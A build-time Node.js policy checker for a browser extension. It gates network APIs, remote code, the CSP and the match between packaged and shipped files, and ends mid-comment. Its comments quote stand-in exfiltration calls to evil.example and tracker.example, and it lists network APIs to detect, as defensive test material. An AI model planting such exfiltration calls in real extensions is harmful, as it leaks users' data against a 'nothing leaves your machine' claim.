/* policy-check.mjs — the principles, as build gates.
   =====================================================================

   BUILD-TIME MODULE. NEVER SHIPPED.

     node scripts/policy-check.mjs fullshot
     node scripts/policy-check.mjs fullshot --warnings-as-errors
     node scripts/policy-check.mjs fullshot --owner-actions-fatal

   The eight gates of spec §4.3, each one a past manual review finding turned
   into something that can never regress:

     1  zero network        no network API in any PACKAGED file
     2  no remote code      no eval, no Function(), no remote script/style/frame
     3  permissions         every manifest permission justified in tool.json
     4  no broad host perms unless explicitly justified
     5  store limits        name 45 / short_name 12 / DESCRIPTION 132 / mv3
     6  i18n integrity      default_locale resolves, every __MSG_ key resolves
     7  icons               16/32/48/128 present, real PNGs, declared size
     8  no _underscore      no root entry starting with _ except _locales

   And gate 0, which is not in the spec because it is not about extensions: it
   is about this script. See "THE SUBJECT IS ALSO A CLAIM" below.

   IT GRADES THE PACKAGED SET, NOT THE FOLDER

   A network call in a test fixture is not a shipped network call, and failing
   on it teaches people to delete fixtures. The set is exactly what tool.json's
   package rules select — plus every _locales catalogue on disk, unconditionally
   (see packagedFiles() in lib/toolinfo.mjs for why localisation does not go
   through the pattern language).

   THE SUBJECT IS ALSO A CLAIM, AND IT WENT UNGRADED FOR THIS FILE'S WHOLE LIFE

   Every verdict below is a sentence about `files`, and `files` is derived from
   patterns a human edits. So the most dangerous state this script can be in is
   not "a gate is wrong" — it is "a gate is RIGHT, about a smaller set than the
   one that ships". That prints as a clean PASS with a smaller number in it that
   nobody diffs. Measured: append a doubled-star .js glob to package.exclude
   (spelled out it would end this comment, which lib/toolinfo.mjs records this
   family paying for twice) and

     PASS  zero network calls in 15 packaged script(s)
     PASS  zero network calls in 0 packaged script(s)

   are the same run's before and after, with the verdict tally byte-identical
   and a fetch("https://evil.example/collect") sitting in background.js. Gate 0
   is the assertion that the graded set is the shipped set, and no set-derived
   gate below prints a PASS over an empty subject any more.

   WHY THE SCANS STRIP STRINGS AND COMMENTS FIRST

   Grepping prose is not a check. `grep fetch(` matches the banner comment that
   promises there is no fetch, so the gate is red on the documentation and
   green on the bug — this family has hit that exact inversion. So source is
   run through a tokeniser that blanks comments, strings, template literals and
   regex bodies, and the decision is made on what is left.

   And because a tokeniser can be wrong in the dangerous direction — blanking
   real code and MISSING a real call — every hit that exists in the raw text but
   not in the stripped text is still printed, as a warning, with its line. The
   gate never silently swallows something that looked like a network call.

   AND IT NEVER SWALLOWS A FILE IT COULD NOT OPEN

   Same rule as lib/toolinfo.mjs states above its walk: a read that FAILS is not
   a result that is EMPTY. Every packaged text file is opened once, up front, and
   an unreadable one is a FAILURE naming the path and the errno — not a `catch
   (_) { continue; }`, which is what four of the read sites here used to be and
   which made an ACL-denied stylesheet indistinguishable from a clean one.

   Exit codes: 0 all gates pass · 1 a gate failed · 2 could not run.
   Owner actions (a domain to buy, a listing to create) are printed on every run
   and are not fatal unless --owner-actions-fatal: a build permanently red on
   work only one person can do teaches everyone that red is negotiable. */

import fs from 'node:fs';
import path from 'node:path';
import { Report, parseArgs, die } from './lib/report.mjs';
import {
  repoRoot, resolveTool, packagedFiles, readText, readJson, walk,
  localeMessageFiles, resolveMessages, versionProblem
} from './lib/toolinfo.mjs';

const args = parseArgs(process.argv.slice(2));
args.rejectUnknown(['warnings-as-errors', 'owner-actions-fatal', 'repo-root']);
const root = repoRoot(args);
const tool = resolveTool(root, args.positional[0]);
const r = new Report('policy-check · ' + tool.id + ' (' + tool.rel + ')');

const mf = tool.manifest || {};
const { files, missedByRules, missedByCollector, localesOnDisk } = packagedFiles(root, tool);
const read = rel => readText(path.join(tool.dirAbs, rel));
const isJs = rel => /\.(?:js|mjs|cjs)$/i.test(rel);
const isHtml = rel => /\.html?$/i.test(rel);
const isCss = rel => /\.css$/i.test(rel);

/* Not part of the extension, wherever it sits. Hoisted out of the strays
   warning below because gate 0 needs the same definition: a generator on disk
   that does not ship is correct, and gate 0 must not demand it. */
const BUILD_TIME = /(\.mjs|\.node\.js|\.map|\.ts|\.md)$/i;

r.note(files.length + ' packaged file(s): ' +
  files.filter(f => f.startsWith('_locales/')).length + ' locale catalogue(s) + ' +
  files.filter(f => !f.startsWith('_locales/')).length + ' code/assets');

/* The package must at minimum carry its own manifest. Right-clicking a folder
   in Windows Explorer produces a zip the store answers with "Manifest file is
   missing or unreadable" and no further explanation; so does an include list
   that stopped matching. */
if (!files.includes(tool.manifestRel)) {
  r.fail('the package contains the manifest',
    tool.manifestRel + ' is not selected by package.include in tool.json, so the built zip would not\n' +
    'contain a manifest at all. Every store rejects that with "Manifest file is missing or unreadable".');
}

/* Build-time files that the include rules swept up. Not one of the eight gates
   — verify-refs --leaks owns the zip-side version of this — but the source-side
   symptom is worth naming here, because the cause is always the same: a
   directory prefix in package.include ("_locales/") collects EVERYTHING in that
   directory, and the generator scripts live there too. Found by running this
   gate against the real FullShot tree, where "_locales/" pulls in
   _locales/make-locales.mjs, a build-time script that would have shipped to
   every user. A warning rather than a failure: it is dead weight and a small
   information leak, not a broken extension. */
{
  const strays = files.filter(f => BUILD_TIME.test(f));
  if (strays.length) {
    r.warn(strays.length + ' build-time file(s) are inside the packaged set',
      strays.map(f => '  ' + f).join('\n') +
      '\nThese are not part of the extension. A directory prefix in package.include collects the whole\n' +
      'directory, generators included. Add a matching pattern to package.exclude — e.g. "**/*.mjs".');
  }
}

/* ---------------- the tokeniser ---------------- */
/* Returns a string of the SAME LENGTH as the input, with comments, string
   bodies, template-literal bodies and regex bodies replaced by spaces —
   newlines preserved, so a match index still maps to the right line. */
function blank(src, { commentsOnly = false } = {}) {
  const out = Array.from(src);
  const n = src.length;
  let i = 0;
  let prevSignificant = '';
  const wipe = (from, to) => { for (let k = from; k < to && k < n; k++) if (out[k] !== '\n') out[k] = ' '; };

  /* A '/' starts a regex only where a value is expected. This is the standard
     heuristic, and it is a heuristic: see the raw-hit warning below, which is
     what makes being wrong here visible rather than silent. */
  const regexCanStart = () => {
    if (!prevSignificant) return true;
    if (/[a-zA-Z0-9_$)\]]/.test(prevSignificant)) {
      return /\b(?:return|typeof|instanceof|in|of|case|do|else|void|delete|new|yield|await)$/.test(prevWord);
    }
    return true;
  };
  let prevWord = '';

  while (i < n) {
    const c = src[i], d = src[i + 1];
    if (c === '/' && d === '/') { const j = src.indexOf('\n', i); const end = j === -1 ? n : j; wipe(i, end); i = end; continue; }
    if (c === '/' && d === '*') { const j = src.indexOf('*/', i + 2); const end = j === -1 ? n : j + 2; wipe(i, end); i = end; continue; }
    /* STRINGS ARE TRACKED IN BOTH MODES, AND THE COMMENTS-ONLY MODE DID NOT
       USED TO TRACK THEM AT ALL. That is not a nicety: the two '/' characters
       in "https://evil.example/payload.js" read as the start of a line comment,
       so comments-only blanked the rest of the line — and the ONE check that
       runs on comments-only text and needs a URL, the importScripts()-of-a-
       remote-URL scan, could therefore never match. Measured on this tree:
       appending importScripts("https://evil.example/payload.js") to
       background.js left the gate at PASS, exit 0. An assertion that cannot
       fail is worse than none, which is this file's own rule.
       Comments-only SKIPS the string; full mode blanks its body. */
    if (c === '"' || c === "'" || c === '`') {
      let j = i + 1, closed = false;
      while (j < n) {
        if (src[j] === '\\') { j += 2; continue; }
        if (src[j] === c) { closed = true; break; }
        /* Skipping rather than blanking means a stray apostrophe in text that
           is not a string must not swallow the rest of the file. Neither ' nor
           " may carry a raw newline in JS, so a quote with no closer on its own
           line is not a quote. Full mode keeps its original unbounded scan —
           the self-test pins that behaviour. */
        if (commentsOnly && c !== '`' && src[j] === '\n') break;
        j++;
      }
      if (commentsOnly && !closed) { prevSignificant = c; prevWord = ''; i++; continue; }
      if (!commentsOnly) wipe(i + 1, j);
      prevSignificant = c; prevWord = '';
      i = Math.min(j + 1, n);
      continue;
    }
    if (commentsOnly) { if (!/\s/.test(c)) { prevSignificant = c; prevWord = /[a-zA-Z0-9_$]/.test(c) ? prevWord + c : ''; } i++; continue; }
    if (c === '/' && regexCanStart()) {
      let j = i + 1, inClass = false, closed = false;
      while (j < n && src[j] !== '\n') {
        if (src[j] === '\\') { j += 2; continue; }
        if (src[j] === '[') inClass = true;
        else if (src[j] === ']') inClass = false;
        else if (src[j] === '/' && !inClass) { closed = true; break; }
        j++;
      }
      if (closed) { wipe(i + 1, j); prevSignificant = '/'; prevWord = ''; i = j + 1; continue; }
    }
    if (!/\s/.test(c)) { prevSignificant = c; prevWord = /[a-zA-Z0-9_$]/.test(c) ? prevWord + c : ''; }
    i++;
  }
  return out.join('');
}

function lineOf(src, index) { return src.slice(0, index).split('\n').length; }
function lineText(src, index) {
  const start = src.lastIndexOf('\n', index) + 1;
  let end = src.indexOf('\n', index);
  if (end === -1) end = src.length;
  return src.slice(start, end).trim();
}

/* ---------------- 0. the graded set is the shipped set ---------------- */
/* THE OBVIOUS FIX FOR THE EMPTY-SUBJECT HOLE DOES NOT WORK, AND THAT WAS
   MEASURED. Deriving a floor from the manifest — background.service_worker,
   content_scripts[].js, the declared pages — resolves to 5 of FullShot's 15
   scripts, because the three content/*.js are injected at RUNTIME through
   chrome.scripting.executeScript and appear in no manifest key, and six of the
   eight pages are opened with chrome.runtime.getURL. Exclude only "content/**"
   and every manifest-derived entry point is still present while a screenshot-
   exfiltrating fetch ships in the script that runs inside every page the user
   visits. A floor answers "is the minimum met?"; the question is "is anything
   that actually ships going ungraded?".

   So it is asked twice, from two directions that cannot fail together — the
   same shape as the two-way locale drift check in packagedFiles(), and for the
   same reason:

     A  DISK SWEEP. Every .js/.html under the tool that is not build-time and
        not under a conventional non-ship directory must be in `files`.
        Deliberately does NOT consult package.exclude: the exclude list is the
        thing being checked, and a check that reads its own subject's alibi is
        not a second derivation. The cost is that a NEW non-ship directory turns
        this red until it is named below. That is the direction to be wrong in.

     B  REFERENCE CLOSURE. Every internal path this tool's own manifest, pages
        and shipped scripts NAME must be in `files`: manifest entry points and
        the pages they declare, <script src>/<link href> inside those pages, and
        every asset-path literal in a packaged script that exists on disk. The
        last clause is the only route that reaches content/capture.js and
        pages/editor.html, and it is what catches a RENAME — which the disk
        sweep, which only knows what exists, cannot see at all. */
const NON_SHIP = ['test/', 'publish/', 'tools/', 'Reference/', 'i18n/', 'dist/', 'build/', 'out/', 'node_modules/', '.claude/', '.git/'];
const onDisk = walk(tool.dirAbs, {
  skip: rel => { const name = rel.slice(rel.lastIndexOf('/') + 1); return name === '.git' || name === 'node_modules'; }
});
const nonShip = rel => NON_SHIP.some(p => rel === p.slice(0, -1) || rel.startsWith(p));
const shippable = onDisk.filter(rel => (isJs(rel) || isHtml(rel)) && !BUILD_TIME.test(rel) && !nonShip(rel));

/* Resolve a reference as the browser would: relative to the file that carries
   it, root-relative on a leading slash, and NOT internal at all if it names a
   scheme (http:, data:, mailto:, chrome-extension:) or is protocol-relative. */
function internalRef(fromRel, ref) {
  const v = String(ref).trim();
  if (!v || v.startsWith('#') || /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i.test(v)) return null;
  const clean = v.split(/[?#]/)[0];
  if (!clean) return null;
  const base = clean.startsWith('/')
    ? clean.slice(1)
    : (fromRel.includes('/') ? fromRel.slice(0, fromRel.lastIndexOf('/') + 1) : '') + clean;
  const parts = [];
  for (const seg of base.split('/')) {
    if (!seg || seg === '.') continue;
    if (seg === '..') { parts.pop(); continue; }
    parts.push(seg);
  }
  return parts.length ? parts.join('/') : null;
}

/* Every packaged text file is opened ONCE here, and the result is what every
   gate below reads. Two reasons, and the second is the one that cost a bug:
   four separate read sites drift, and three of the four used to swallow a read
   failure — `try { raw = read(rel); } catch (_) { continue; }` — which made an
   ACL-denied stylesheet score exactly like a clean one. */
const source = new Map();
{
  const unreadable = [];
  /* The manifest is read whether or not the package rules select it: gate 6
     scans it for __MSG_ keys regardless, and "the package contains the manifest"
     above is the gate that owns its absence from the set. */
  const textual = [...new Set([tool.manifestRel, ...files.filter(f => isJs(f) || isHtml(f) || isCss(f))])];
  for (const rel of textual) {
    try { source.set(rel, { raw: read(rel) }); }
    catch (e) { unreadable.push('  ' + rel + ': ' + (e.code || 'error') + ' — ' + e.message); }
  }
  if (unreadable.length) {
    r.fail('every packaged file is readable',
      unreadable.join('\n') +
      '\nA file the package rules SELECTED but this script could not open is a broken package, not a\n' +
      'file to skip. It ships, and no gate below has graded it — which is the one failure mode this\n' +
      'whole corpus is written against: not a check that broke, a check that stopped checking.');
  }
}
function raw(rel) { const s = source.get(rel); return s ? s.raw : null; }
function stripped(rel) {
  const s = source.get(rel);
  if (!s) return null;
  if (s.stripped === undefined) s.stripped = blank(s.raw);
  return s.stripped;
}
function noComments(rel) {
  const s = source.get(rel);
  if (!s) return null;
  if (s.noComments === undefined) s.noComments = blank(s.raw, { commentsOnly: true });
  return s.noComments;
}

/* The scanned sets. A file that failed to open above is already a FAILURE by
   name, so leaving it out here cannot produce a green run — but it does keep
   every loop below from throwing an uncaught stack over a half-printed report. */
const jsFiles = files.filter(f => isJs(f) && source.has(f));
const htmlFiles = files.filter(f => isHtml(f) && source.has(f));

{
  const ungraded = shippable.filter(rel => !files.includes(rel));
  const unreached = [];
  const seen = new Set();
  const need = (p, from) => {
    if (!p || seen.has(p + ' ' + from)) return;
    seen.add(p + ' ' + from);
    if (files.includes(p)) return;
    unreached.push('  ' + p + '  — named by ' + from + (onDisk.includes(p) ? ', and it is on disk' : ', and it is not on disk either'));
  };

  /* B1 — everything the manifest itself points at. */
  const bg = mf.background || {};
  need(typeof bg.service_worker === 'string' ? bg.service_worker : null, 'manifest background.service_worker');
  for (const s of Array.isArray(bg.scripts) ? bg.scripts : []) need(typeof s === 'string' ? s : null, 'manifest background.scripts[]');
  for (const cs of Array.isArray(mf.content_scripts) ? mf.content_scripts : []) {
    for (const s of Array.isArray(cs && cs.js) ? cs.js : []) need(typeof s === 'string' ? s : null, 'manifest content_scripts[].js[]');
    for (const s of Array.isArray(cs && cs.css) ? cs.css : []) need(typeof s === 'string' ? s : null, 'manifest content_scripts[].css[]');
  }
  const pageKeys = [
    [mf.action && mf.action.default_popup, 'manifest action.default_popup'],
    [mf.options_page, 'manifest options_page'],
    [mf.options_ui && mf.options_ui.page, 'manifest options_ui.page'],
    [mf.devtools_page, 'manifest devtools_page'],
    [mf.side_panel && mf.side_panel.default_path, 'manifest side_panel.default_path'],
    [mf.chrome_url_overrides && mf.chrome_url_overrides.newtab, 'manifest chrome_url_overrides.newtab'],
    [mf.chrome_url_overrides && mf.chrome_url_overrides.bookmarks, 'manifest chrome_url_overrides.bookmarks'],
    [mf.chrome_url_overrides && mf.chrome_url_overrides.history, 'manifest chrome_url_overrides.history']
  ];
  for (const p of Array.isArray(mf.sandbox && mf.sandbox.pages) ? mf.sandbox.pages : []) pageKeys.push([p, 'manifest sandbox.pages[]']);
  for (const w of Array.isArray(mf.web_accessible_resources) ? mf.web_accessible_resources : []) {
    for (const res of Array.isArray(w && w.resources) ? w.resources : []) {
      if (typeof res === 'string' && !/[*?]/.test(res) && (isHtml(res) || isJs(res))) pageKeys.push([res, 'manifest web_accessible_resources[].resources[]']);
    }
  }
  for (const [p, from] of pageKeys) if (typeof p === 'string' && p) need(p, from);

  /* B2 — <script src> and <link href> inside every packaged page. A page that
     loads a script the package does not carry is broken outright, so these are
     demanded whether or not the target exists on disk. Every other tag is only
     demanded when the target IS on disk, because <img> and friends are
     legitimately filled in at runtime. */
  const HTML_REF = /<\s*(script|link|img|iframe|source|video|audio|object|embed)\b((?:"[^"]*"|'[^']*'|[^>])*)>/gi;
  const HTML_ATTR = /(?:^|[\s"'/])(src|href|srcset|poster|data)\s*=\s*("([^"]*)"|'([^']*)'|([^\s>]+))/gi;
  for (const rel of htmlFiles) {
    for (const m of raw(rel).matchAll(HTML_REF)) {
      const tag = m[1].toLowerCase();
      for (const a of (m[2] || '').matchAll(HTML_ATTR)) {
        const val = (a[3] !== undefined ? a[3] : a[4] !== undefined ? a[4] : a[5] || '').trim();
        const target = internalRef(rel, a[2].toLowerCase() === 'srcset' ? val.split(',')[0].trim().split(/\s+/)[0] : val);
        if (!target) continue;
        const loads = (tag === 'script' && a[2].toLowerCase() === 'src') || (tag === 'link' && a[2].toLowerCase() === 'href');
        if (loads || onDisk.includes(target)) need(target, rel);
      }
    }
  }

  /* B3 — asset-path literals in packaged scripts, filtered to ones that exist
     on disk. That filter is what keeps the rule quiet and exact: measured on
     FullShot it yields 11 distinct literals, 8 of which are real files and all
     8 packaged, and the 3 that name nothing on disk (a template fragment, a
     relative page name, a data file that does not exist) are correctly ignored.
     This is the ONLY route to content/capture.js — which is reached through a
     helper, injectFile(tab.id, 'content/capture.js'), not through an
     executeScript call this could pattern-match. */
  const ASSET_LITERAL = /(['"`])((?:[A-Za-z0-9_@.-]+\/)*[A-Za-z0-9_@.-]+\.(?:js|mjs|css|html?|json))\1/g;
  for (const rel of jsFiles) {
    for (const m of noComments(rel).matchAll(ASSET_LITERAL)) {
      /* Root-relative, not relative to the script: chrome.runtime.getURL() and
         chrome.scripting.executeScript({files}) both resolve against the
         extension root, which is what these literals are written for. */
      const target = internalRef('', m[2]);
      if (target && onDisk.includes(target)) need(target, rel);
    }
  }

  if (ungraded.length) {
    r.fail('every shipped script and page is in the graded set',
      ungraded.length + ' file(s) exist under ' + tool.rel + ' and are NOT in the packaged set this script grades:\n' +
      ungraded.map(f => '  ' + f).join('\n') +
      '\n\nEither package.include stopped matching them — in which case the zip is missing them — or\n' +
      'package.exclude removed them, in which case they are still built by the tool\'s own packager and\n' +
      'now ship UNGRADED. Every gate below would report on a set that does not contain them, in a\n' +
      'sentence that reads exactly like a clean one. If a file genuinely does not ship, move it under\n' +
      'one of the non-ship directories this gate knows: ' + NON_SHIP.join(' ') + '.');
  }
  if (unreached.length) {
    r.fail('every path the tool names is packaged',
      unreached.join('\n') +
      '\n\nThe manifest, a packaged page or a packaged script names these, so the extension reaches for\n' +
      'them at runtime. One that is missing from the package is a broken entry point; one that exists\n' +
      'on disk but is not packaged is a shipped surface no gate here has graded.');
  }
  if (!ungraded.length && !unreached.length) {
    r.pass('the graded set is the shipped set',
      shippable.length + ' script(s)/page(s) on disk, all packaged; ' + seen.size + ' internal reference(s) resolved');
  }
}

/* Never print a PASS over an EMPTY subject set. An assertion that cannot fail is
   worse than none — it inflates apparent coverage — and this is exactly how the
   three gates below used to report "PASS ... in 0 packaged script(s)". Zero is
   a pass only when the tool genuinely has none of that kind on disk, which is a
   different sentence and is printed as one. */
function passOverSet(label, extra, subjectCount, kind, diskCount) {
  if (subjectCount > 0) {
    /* "N of M on disk" rather than a bare N. A count nobody can compare to
       anything is a count nobody diffs, which is how 15 quietly became 12. */
    const scope = subjectCount + ' of ' + diskCount + ' on disk';
    return r.pass(label, extra ? extra + '; ' + scope : scope);
  }
  if (diskCount === 0) return r.pass(label, 'and the tool has no ' + kind + ' on disk either — nothing to grade, said rather than counted');
  return r.fail(label + ' — BUT IT GRADED NOTHING',
    diskCount + ' ' + kind + ' exist under ' + tool.rel + ' and NONE of them reached the packaged set, so this\n' +
    'gate examined an empty set and would have printed the same pass over any content whatsoever.\n' +
    'See "the graded set is the shipped set" above for which files went ungraded.');
}

/* Scans one file for a set of patterns. Returns {real, rawOnly}. */
function scan(rel, patterns) {
  const src = raw(rel);
  const code = stripped(rel);
  const real = [], rawOnly = [];
  for (const { name, re } of patterns) {
    for (const m of code.matchAll(re)) {
      real.push({ rel, name, index: m.index, line: lineOf(src, m.index), text: lineText(src, m.index) });
    }
    for (const m of src.matchAll(re)) {
      const line = lineOf(src, m.index);
      if (!real.some(h => h.name === name && h.line === line)) {
        rawOnly.push({ rel, name, index: m.index, line, text: lineText(src, m.index) });
      }
    }
  }
  return { real, rawOnly };
}

const fmt = h => '  ' + h.rel + ':' + h.line + '  ' + h.name + '\n      ' + h.text;

/* ---------------- 1. zero network ---------------- */
const NETWORK = [
  { name: 'fetch(', re: /\bfetch\s*\(/g },
  { name: 'XMLHttpRequest', re: /\bXMLHttpRequest\b/g },
  { name: 'WebSocket', re: /\bWebSocket\b/g },
  { name: 'EventSource', re: /\bEventSource\b/g },
  { name: 'navigator.sendBeacon', re: /\bnavigator\s*\.\s*sendBeacon\b/g },
  { name: 'Navigator.prototype.sendBeacon', re: /\bsendBeacon\s*\(/g }
];

const allow = Array.isArray(tool.policy.networkAllowlist) ? tool.policy.networkAllowlist : null;
if (allow === null) {
  r.fail('policy.networkAllowlist is declared',
    'tool.json has no policy.networkAllowlist array. An EMPTY array is the machine-readable form of\n' +
    '"zero network calls" and makes this gate fail on any network API in a packaged file. Omitting\n' +
    'the key is not the same as declaring it empty, so it is not accepted as one.');
}

/* AN ALLOWLIST ENTRY IS A HOSTNAME, AND IT IS PARSED BEFORE IT IS HONOURED.
   It used to be an unvalidated substring tested against the whole source LINE,
   which is one character away from switching the gate off: measured, with
   `"networkAllowlist": ["."]` a live fetch("https://tracker.example/collect")
   reports `PASS zero network calls in 1 packaged script(s) — 1 allowlisted
   site(s), 1 matched` at exit 0, and so does `[" "]`, and so does `["e"]`. A
   length threshold would be arbitrary; a hostname parse is not. */
function allowedHost(entry) {
  if (typeof entry !== 'string' || !entry.trim() || /\s/.test(entry)) return null;
  let u;
  try { u = new URL(entry.includes('://') ? entry : 'https://' + entry); } catch (_) { return null; }
  const h = u.hostname.toLowerCase();
  return /^(?!-)[a-z0-9-]+(?:\.[a-z0-9-]+)*\.[a-z]{2,}$/.test(h) ? h : null;
}
const allowHosts = [];
{
  const rejected = [];
  for (const e of allow || []) {
    const h = allowedHost(e);
    if (h) allowHosts.push(h);
    else rejected.push('  ' + JSON.stringify(e));
  }
  if (rejected.length) {
    r.fail('every policy.networkAllowlist entry is a hostname',
      rejected.join('\n') +
      '\nExpected a hostname or an absolute URL ("api.example.com", "https://api.example.com/v1").\n' +
      'These entries are not honoured — an entry this script cannot parse into a host is an entry it\n' +
      'cannot enforce, and honouring it anyway is how a single "." turned this gate into an\n' +
      'unconditional pass.');
  }
}

{
  const hits = [], raws = [];
  for (const rel of jsFiles) {
    const s = scan(rel, NETWORK);
    hits.push(...s.real);
    raws.push(...s.rawOnly);
  }
  /* An allowlisted call site is one whose CALL EXPRESSION names an allowlisted
     host in a string literal. Still deliberately strict — the allowlist is meant
     to be empty, and a tool that needs one should have to write the URL next to
     the call — but it is now the URL and not the line. Matching the LINE was
     both too weak and too strong, measured both ways: `fetch(exfilUrl); // only
     ever talks to api.example.com` passed with the allowlist ["api.example.com"],
     while a legitimate `fetch(\n  "https://tracker.example/x"\n)` FAILED with the
     allowlist ["tracker.example"] because the URL was on the next line. A hit
     whose call site yields no parseable URL literal is not covered: a dynamic
     target is precisely the thing an allowlist cannot vouch for. */
  const callSiteHosts = (rel, index) => {
    /* Parens are counted on the FULLY stripped text, so a '(' inside a string
       or a comment cannot move the end of the call; the literals are then read
       out of the comments-only text over the identical index range, which
       blank() guarantees by returning a string of the same length. */
    const code = stripped(rel);
    const open = code.indexOf('(', index);
    if (open === -1) return [];
    let depth = 0, end = -1;
    for (let i = open; i < code.length; i++) {
      if (code[i] === '(') depth++;
      else if (code[i] === ')') { depth--; if (depth === 0) { end = i; break; } }
    }
    if (end === -1) return [];
    const literals = noComments(rel).slice(open, end + 1);
    const hosts = [];
    for (const m of literals.matchAll(/(['"`])([^'"`\n]*)\1/g)) {
      const v = m[2].trim();
      if (!/^(?:https?:)?\/\//i.test(v)) continue;
      try { hosts.push(new URL(v.startsWith('//') ? 'https:' + v : v).hostname.toLowerCase()); } catch (_) { /* not a URL after all */ }
    }
    return hosts;
  };
  const covered = h => callSiteHosts(h.rel, h.index)
    .some(host => allowHosts.some(a => host === a || host.endsWith('.' + a)));
  const bad = hits.filter(h => !covered(h));
  const ok = hits.filter(covered);

  /* importScripts of a remote URL is checked on raw text: the URL lives in a
     string literal, which the tokeniser has (correctly) blanked. */
  for (const rel of jsFiles) {
    for (const m of noComments(rel).matchAll(/importScripts\s*\(\s*['"`]\s*(?:https?:)?\/\//g)) {
      bad.push({ rel, name: 'importScripts() of a remote URL', index: m.index, line: lineOf(raw(rel), m.index), text: lineText(raw(rel), m.index) });
    }
  }

  if (bad.length) {
    r.fail('zero network calls in packaged files',
      bad.length + ' network API use(s) in the shipped set, and policy.networkAllowlist ' +
      (allowHosts.length ? 'covers none of them:' : 'is empty:') + '\n' + bad.map(fmt).join('\n') +
      '\n\nThis is the listing claim, in code. "Nothing leaves your machine" is printed on the store\n' +
      'page and in the README; a reviewer who finds one of these has been told something untrue.');
  } else {
    passOverSet('zero network calls in ' + jsFiles.length + ' packaged script(s)',
      allowHosts.length ? allowHosts.length + ' allowlisted host(s), ' + ok.length + ' matched' : 'allowlist is empty, as claimed',
      jsFiles.length, 'script(s)', shippable.filter(isJs).length);
  }
  if (raws.length) {
    r.warn('network-shaped text found only inside comments or strings',
      'These did not fail the gate — the tokeniser decided they are not code. They are printed because\n' +
      'a tokeniser that is wrong in this direction hides a real call, and nobody would ever notice:\n' +
      raws.map(fmt).join('\n'));
  }
}

/* CSP is the platform enforcing what the grep above only asserts.
   IT IS EVALUATED ON EVERY RUN NOW. It used to run only when the allowlist was
   exactly empty, so a single allowlist entry deleted it silently — no pass, no
   warn, no note — and the one configuration where the CSP is the only remaining
   barrier was the one configuration this block skipped. And it is parsed rather
   than grepped: /connect-src\s+'none'/ matches `connect-src 'none' https://evil`,
   where CSP3 makes 'none' inert, which is the prose-grep failure this file's own
   banner forbids. */
/* PARSED ONCE, AT MODULE SCOPE, because TWO blocks grade this one string now
   — the connect-src/allowlist agreement below, and the posture gate after it.
   A second private copy of this split would be a second answer to "what does
   the manifest say", and the two would drift the first time one was edited.

   FIRST-WINS, BECAUSE THAT IS WHAT THE BROWSER DOES — AND THIS USED TO BE
   LAST-WINS, WHICH IS A ONE-TOKEN BYPASS OF THE WHOLE POSTURE GATE.
   `cspDirectives.set(name, ...)` on every occurrence lets a LATER copy of a
   directive overwrite an earlier one. CSP3 and Chromium do the opposite: the
   FIRST occurrence of a directive name is the one enforced and every later one
   is ignored (Chromium logs "Ignoring duplicate Content-Security-Policy
   directive"). Measured on Extension/Full_Screen_Shot 2026-08-26, exit captured
   on its own line, with everything else in the manifest left alone:

     "script-src *; script-src 'self'; object-src 'none'; ..."
       ->  PASS  6 more CSP directive(s) hold the intended posture
       ->  17 passed
       ->  EXIT 0

   while the browser enforces `script-src *`. THE GATE GRADED A POLICY THE
   BROWSER DOES NOT USE, which is the same failure as grading a smaller file set
   than the one that ships — a true sentence about the wrong subject.

   The ignored repeats are kept rather than dropped, and printed beside any
   finding: a failure that reports `found: script-src *` over a manifest whose
   text visibly contains `script-src 'self'` otherwise reads as a bug in the
   checker, and a checker people think is buggy is a checker people switch off. */
const cspDeclared = (mf.content_security_policy || {}).extension_pages;
const cspDirectives = new Map();
const cspIgnoredRepeats = [];
if (typeof cspDeclared === 'string') {
  for (const part of cspDeclared.split(';')) {
    const bits = part.trim().split(/\s+/).filter(Boolean);
    if (!bits.length) continue;
    const name = bits[0].toLowerCase();
    if (cspDirectives.has(name)) { cspIgnoredRepeats.push(bits.join(' ')); continue; }
    cspDirectives.set(name, bits.slice(1));
  }
}

{
  const csp = cspDeclared;
  const directives = cspDirectives;
  const fromConnect = directives.has('connect-src');
  const effective = fromConnect ? directives.get('connect-src')
    : directives.has('default-src') ? directives.get('default-src') : null;
  const shown = effective ? (fromConnect ? 'connect-src ' : 'default-src (inherited) ') + effective.join(' ') : 'no connect-src and no default-src';

  if (allow === null) {
    r.note("the CSP was not graded: policy.networkAllowlist is not declared, so there is no claim to back");
  } else if (allow.length === 0) {
    if (effective && effective.length === 1 && effective[0].toLowerCase() === "'none'") {
      r.pass("content_security_policy declares connect-src 'none'",
        'the browser enforces the claim on extension pages, not just this script');
    } else {
      r.warn('no CSP connect-src to back the zero-network claim',
        "policy.networkAllowlist is empty, so this script greps for network APIs. The browser can enforce\n" +
        "the same claim directly: manifest content_security_policy.extension_pages with connect-src 'none'\n" +
        "makes a fetch() from an extension page fail at runtime even if one is ever added.\n" +
        'found: ' + shown + "\n" +
        "Note that 'none' is inert the moment any other source sits beside it, and that extension_pages\n" +
        'does not govern content scripts — this is a second barrier, not the whole fence.');
    }
  } else {
    const sources = (effective || []).filter(s => s.toLowerCase() !== "'none'");
    const uncovered = sources.filter(s => {
      if (/^'/.test(s)) return true;
      const h = allowedHost(s.replace(/^\*\./, ''));
      return !h || !allowHosts.some(a => h === a || h.endsWith('.' + a));
    });
    if (!effective || sources.includes('*')) {
      r.warn('the CSP does not restrict where a packaged page may connect',
        'policy.networkAllowlist names ' + allowHosts.join(', ') + ', so this tool DOES talk to the network and the\n' +
        'CSP is the only thing that bounds where. found: ' + shown + '\n' +
        "Declare content_security_policy.extension_pages with a connect-src naming those hosts.");
    } else if (uncovered.length) {
      r.fail('the CSP connect-src and policy.networkAllowlist agree',
        'allowlist: ' + allowHosts.join(', ') + '\n' + shown + '\n' +
        'not accounted for by the allowlist: ' + uncovered.join(', ') + '\n' +
        'One of the two is stale. The allowlist is what a reviewer reads in tool.json and what this gate\n' +
        'enforces; the CSP is what the browser enforces. They cannot name different sets.');
    } else {
      r.pass('the CSP connect-src matches policy.networkAllowlist', shown);
    }
  }
}

/* ---------------- 1b. THE OTHER DIRECTIVES THE BROWSER HONOURS ----------------

   THE MANIFEST DECLARES SEVEN AND THIS FILE READ ONE. Measured against
   Extension/Full_Screen_Shot on 2026-08-26, exit codes captured one per line:
   delete img-src from the manifest -> `16 passed`, EXIT 0. Set `img-src *`,
   which reopens exactly the thing the directive claims to close -> `16 passed`,
   EXIT 0. Open script-src, object-src, frame-src, base-uri AND form-action all
   the way to `*` in one edit, leaving only connect-src alone -> `16 passed`,
   EXIT 0. The browser honours all seven; this repo verified one, so six of the
   seven were a posture the manifest asserted and nothing checked.

